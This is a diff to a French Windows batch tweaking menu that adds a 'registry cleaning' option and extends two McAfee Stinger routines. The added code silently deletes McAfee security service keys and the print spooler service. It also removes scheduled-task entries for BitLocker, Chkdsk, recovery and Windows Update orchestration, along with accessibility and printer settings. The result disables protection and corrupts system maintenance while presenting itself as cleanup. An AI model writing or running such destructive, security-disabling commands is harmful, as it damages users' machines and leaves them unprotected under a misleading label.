@@ -26,7 +26,7 @@ set indigo=[38;5;105m
 cd /d %~dp0
 color 7
 
-SET VERSCRIPT=0024
+SET VERSCRIPT=0025
 
 rmdir %SystemDrive%\Windows\system32\adminrightstest >nul 2>&1
 mkdir %SystemDrive%\Windows\system32\adminrightstest >nul 2>&1
@@ -91,9 +91,9 @@ echo ³  %orange%PÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
 echo ³  %orange%T%white% %indigo%[55]%white% Autoruns                   %orange%³%white%   %indigo%[56]%white% Device Cleanup             %orange%³%white%   %indigo%[57]%white% CCleaner                   %orange%³%white%   %indigo%[58]%white% Dism++                   %orange%T%white%  ³
 echo ³  %orange%ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ%white%  ³
 echo ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
-echo ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
-echo      %indigo%[97]%white% %gold%UPDATE%white%                     º                                                                       º   %indigo%[98]%white% HELP
-echo ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»                              ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+echo ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+echo      %indigo%[97]%white% %gold%UPDATE%white%                     º %indigo%[ X ]%white% Nettoyage registres     º                                       º   %indigo%[98]%white% HELP
+echo ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍ»                              ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
 echo      %indigo%[99]%white% COPIER : %bblue% " Fc#$f6EtsY@&duxFqg3B " %defcolor% º %indigo%[100]%white% Configurer les jeux     º                                                       %ggold% %black%VER : %VERSCRIPT%%white% %defcolor%
 echo ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
 set /p CSTARTR="%green%>%white%"
@@ -602,6 +602,9 @@ IF "%CSTARTR%"=="100" (
 	goto :GAMECONF
 )
 
+IF "%CSTARTR%"=="x" goto :SCCLEAR
+IF "%CSTARTR%"=="X" goto :SCCLEAR
+
 goto :MAINW
 
 :Firtstr
@@ -817,6 +820,22 @@ FOR %%i IN ("Stinger_*.html") DO Set FileNameStinger="%%i"
 Start "" "%FileNameStinger%"
 @timeout /t 01>nul
 Del %FileNameStinger%>nul
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\McShield" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfefire" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfemms" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfeaack" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfeaacsk" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mdeavfk" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfeelamk" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfefirek" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfehck" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfehidk" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfeplk" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfekdet" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfeelamk" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfefpk" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mferkdet" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfewfpk" /f >nul 2>&1
 goto :MAINW
 
 :GST45F
@@ -828,4 +847,193 @@ FOR %%i IN ("Stinger_*.html") DO Set FileNameStinger="%%i"
 Start "" "%FileNameStinger%"
 @timeout /t 01>nul
 Del %FileNameStinger%>nul
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\McShield" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfefire" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfemms" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfeaack" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfeaacsk" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mdeavfk" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfeelamk" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfefirek" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfehck" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfehidk" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfeplk" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfekdet" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfeelamk" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfefpk" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mferkdet" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfewfpk" /f >nul 2>&1
+goto :MAINW
+
+:SCCLEAR
+sc delete epp >nul 2>&1
+sc delete spooler >nul 2>&1
+sc delete GameInputSvc >nul 2>&1
+sc delete WinRing0_1_2_0 >nul 2>&1
+sc delete "AMD External Events Utility" >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\McShield" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfefire" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfemms" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfeaack" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfeaacsk" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mdeavfk" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfeelamk" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfefirek" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfehck" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfehidk" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfeplk" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfekdet" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfeelamk" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfefpk" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mferkdet" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\CurrentControlSet\Services\mfewfpk" /f >nul 2>&1
+
+Reg.exe delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Policies\Microsoft\Windows\OneDrive" /v "DisableFileSyncNGSC" /f >nul 2>&1
+Reg.exe delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "AUOptions" /f >nul 2>&1
+Reg.exe delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "AutoInstallMinorUpdates" /f >nul 2>&1
+Reg.exe delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAUAsDefaultShutdownOption" /f >nul 2>&1
+Reg.exe delete "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehavior" /f >nul 2>&1
+Reg.exe delete "HKCU\System\GameConfigStore" /v "GameDVR_HonorUserFSEBehaviorMode" /f >nul 2>&1
+Reg.exe delete "HKCU\System\GameConfigStore" /v "GameDVR_EFSEFeatureFlags" /f >nul 2>&1
+Reg.exe delete "HKCU\System\GameConfigStore" /v "GameDVR_DXGIHonorFSEWindowsCompatible" /f >nul 2>&1
+Reg.exe delete "HKCU\Control Panel\Accessibility\AudioDescription" /f >nul 2>&1
+Reg.exe delete "HKCU\Control Panel\Accessibility\Blind Access" /f >nul 2>&1
+Reg.exe delete "HKCU\Control Panel\Accessibility\HighContrast" /f >nul 2>&1
+Reg.exe delete "HKCU\Control Panel\Accessibility\Keyboard Preference" /f >nul 2>&1
+Reg.exe delete "HKCU\Control Panel\Accessibility\Keyboard Response" /f >nul 2>&1
+Reg.exe delete "HKCU\Control Panel\Accessibility\MouseKeys" /f >nul 2>&1
+Reg.exe delete "HKCU\Control Panel\Accessibility\On" /f >nul 2>&1
+Reg.exe delete "HKCU\Control Panel\Accessibility\ShowSounds" /f >nul 2>&1
+Reg.exe delete "HKCU\Control Panel\Accessibility\SlateLaunch" /f >nul 2>&1
+Reg.exe delete "HKCU\Control Panel\Accessibility\SoundSentry" /f >nul 2>&1
+Reg.exe delete "HKCU\Control Panel\Accessibility\StickyKeys" /f >nul 2>&1
+Reg.exe delete "HKCU\Control Panel\Accessibility\TimeOut" /f >nul 2>&1
+Reg.exe delete "HKCU\Control Panel\Accessibility\ToggleKeys" /f >nul 2>&1
+Reg.exe delete "HKU\.DEFAULT\Control Panel\Accessibility\AudioDescription" /f >nul 2>&1
+Reg.exe delete "HKU\.DEFAULT\Control Panel\Accessibility\Blind Access" /f >nul 2>&1
+Reg.exe delete "HKU\.DEFAULT\Control Panel\Accessibility\HighContrast" /f >nul 2>&1
+Reg.exe delete "HKU\.DEFAULT\Control Panel\Accessibility\Keyboard Preference" /f >nul 2>&1
+Reg.exe delete "HKU\.DEFAULT\Control Panel\Accessibility\Keyboard Response" /f >nul 2>&1
+Reg.exe delete "HKU\.DEFAULT\Control Panel\Accessibility\MouseKeys" /f >nul 2>&1
+Reg.exe delete "HKU\.DEFAULT\Control Panel\Accessibility\On" /f >nul 2>&1
+Reg.exe delete "HKU\.DEFAULT\Control Panel\Accessibility\ShowSounds" /f >nul 2>&1
+Reg.exe delete "HKU\.DEFAULT\Control Panel\Accessibility\SlateLaunch" /f >nul 2>&1
+Reg.exe delete "HKU\.DEFAULT\Control Panel\Accessibility\SoundSentry" /f >nul 2>&1
+Reg.exe delete "HKU\.DEFAULT\Control Panel\Accessibility\StickyKeys" /f >nul 2>&1
+Reg.exe delete "HKU\.DEFAULT\Control Panel\Accessibility\TimeOut" /f >nul 2>&1
+Reg.exe delete "HKU\.DEFAULT\Control Panel\Accessibility\ToggleKeys" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows\CurrentVersion\HotStart" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Sidebar" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Telephony" /f >nul 2>&1
+Reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Screensavers" /f >nul 2>&1
+Reg.exe delete "HKCU\Printers" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\ControlSet001\Control\Print" /f >nul 2>&1
+Reg.exe delete "HKLM\SYSTEM\ControlSet002\Control\Print" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Boot\{304D2127-E6ED-4C82-B9B3-63B3B54A4D66}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Boot\{44AF7ADA-1C0D-43B1-A063-9E7581F7730B}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Logon\{88CE6B8C-B14B-499A-8D43-214F06116F07}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Logon\{892625FE-213B-4B60-95ED-A1CEFCAA365D}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Maintenance\{00446CF1-8668-472D-BEDD-D0BB88DBA009}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Maintenance\{117E2D01-1275-4560-90E9-A34BB4EE69A3}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Maintenance\{57C76B66-AD3C-4221-81FA-55045859B06F}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Maintenance\{70EA2999-165C-4933-9027-250FB8B772F8}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Maintenance\{A2FADBDF-6855-42F7-BDFC-F0C510EDA9BC}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Maintenance\{C9EC268B-1D36-4AF0-A1EB-2C1BC3B455D9}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Maintenance\{F0FCA53B-F391-48AD-91F6-D1994846E55E}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Plain\{00446CF1-8668-472D-BEDD-D0BB88DBA009}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Plain\{117E2D01-1275-4560-90E9-A34BB4EE69A3}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Plain\{2DFC28A5-3035-4555-A9E6-CE6D44EB1DB3}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Plain\{309BA321-F7C8-46A4-BA50-5FAC484229CB}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Plain\{34ADEFE8-89DB-43BC-8C0B-14BB34D69F6D}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Plain\{3AB082DC-B77E-4487-BB5D-5DCB3A6C2B3C}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Plain\{3E51A991-10E2-4B16-B5B4-A2F051544BB9}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Plain\{3FC4BE91-4A96-48F5-8858-1628CB88EFB5}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Plain\{4671B5C1-A383-4428-A45A-8D348E4CB873}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Plain\{57C76B66-AD3C-4221-81FA-55045859B06F}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Plain\{6EF4AFAB-DF3D-467E-BB2C-66C7FDC9E4E7}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Plain\{70EA2999-165C-4933-9027-250FB8B772F8}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Plain\{82CE5325-8693-4EE3-BB57-939DC11EA637}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Plain\{87094343-6C1F-4855-A6B9-305BA74AB761}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Plain\{8FF5DE67-C947-4488-997B-4184221E7D50}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Plain\{90F68E39-00DE-4159-BCDB-5C5759A5CF53}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Plain\{9B29B882-A95C-438B-BF91-E7C31B1D82D1}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Plain\{A08D6A77-C926-4E78-9ED0-09836E2769AE}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Plain\{A2FADBDF-6855-42F7-BDFC-F0C510EDA9BC}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Plain\{C5D47392-881C-422A-9BF8-E4916B55CD22}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Plain\{C9EC268B-1D36-4AF0-A1EB-2C1BC3B455D9}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Plain\{EAD9ED20-AC69-4E97-8CCB-E8F62CA707B3}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Plain\{EC3EFE4E-A2E4-4C66-975C-CA2EFD0D42CD}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Plain\{F0FCA53B-F391-48AD-91F6-D1994846E55E}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{00446CF1-8668-472D-BEDD-D0BB88DBA009}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{117E2D01-1275-4560-90E9-A34BB4EE69A3}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{2DFC28A5-3035-4555-A9E6-CE6D44EB1DB3}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{304D2127-E6ED-4C82-B9B3-63B3B54A4D66}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{309BA321-F7C8-46A4-BA50-5FAC484229CB}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{34ADEFE8-89DB-43BC-8C0B-14BB34D69F6D}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{3AB082DC-B77E-4487-BB5D-5DCB3A6C2B3C}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{3E51A991-10E2-4B16-B5B4-A2F051544BB9}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{3FC4BE91-4A96-48F5-8858-1628CB88EFB5}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{44AF7ADA-1C0D-43B1-A063-9E7581F7730B}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{4671B5C1-A383-4428-A45A-8D348E4CB873}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{57C76B66-AD3C-4221-81FA-55045859B06F}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{6EF4AFAB-DF3D-467E-BB2C-66C7FDC9E4E7}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{70EA2999-165C-4933-9027-250FB8B772F8}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{82CE5325-8693-4EE3-BB57-939DC11EA637}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{87094343-6C1F-4855-A6B9-305BA74AB761}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{88CE6B8C-B14B-499A-8D43-214F06116F07}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{892625FE-213B-4B60-95ED-A1CEFCAA365D}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{8FF5DE67-C947-4488-997B-4184221E7D50}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{90F68E39-00DE-4159-BCDB-5C5759A5CF53}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{9B29B882-A95C-438B-BF91-E7C31B1D82D1}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{A08D6A77-C926-4E78-9ED0-09836E2769AE}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{A2FADBDF-6855-42F7-BDFC-F0C510EDA9BC}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{C5D47392-881C-422A-9BF8-E4916B55CD22}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{C9EC268B-1D36-4AF0-A1EB-2C1BC3B455D9}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{EAD9ED20-AC69-4E97-8CCB-E8F62CA707B3}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{EC3EFE4E-A2E4-4C66-975C-CA2EFD0D42CD}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{F0FCA53B-F391-48AD-91F6-D1994846E55E}" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\BitLocker" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\Chkdsk" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\Data Integrity Scan" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\DiskFootprint" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\InstallService" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\RecoveryEnvironment" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\Registry" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\SoftwareProtectionPlatform" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\TextServicesFramework" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\UpdateOrchestrator\Report policies" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\UpdateOrchestrator\Schedule Scan" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\UpdateOrchestrator\Schedule Scan Static Task" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\UpdateOrchestrator\Schedule Work" /f >nul 2>&1
+Reg.exe delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\UpdateOrchestrator\USO_UxBroker" /f >nul 2>&1
